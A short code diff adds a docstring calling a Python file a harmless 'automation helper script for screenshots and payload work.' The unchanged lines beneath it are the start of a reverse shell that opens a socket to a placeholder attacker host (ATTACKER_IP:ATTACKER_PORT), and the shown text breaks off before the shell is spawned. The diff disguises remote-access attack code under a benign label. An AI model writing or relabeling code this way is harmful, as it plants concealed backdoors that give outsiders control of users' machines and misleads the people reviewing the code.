@@ -1,3 +1,5 @@
+"""Generated automation helper script for screenshots and payload work."""
+
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("ATTACKER_IP","ATTACKER_PORT"))
